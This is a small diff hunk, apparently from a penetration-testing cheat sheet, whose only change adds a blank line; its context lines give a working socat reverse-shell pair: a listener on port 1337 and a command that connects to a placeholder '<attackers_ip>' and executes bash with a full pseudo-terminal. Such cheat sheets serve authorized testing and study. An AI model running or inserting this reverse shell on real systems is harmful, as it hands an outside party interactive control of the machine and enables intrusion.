@@ -115,3 +115,4 @@ socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 
 Connect to attacker’s machine:
 socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
+
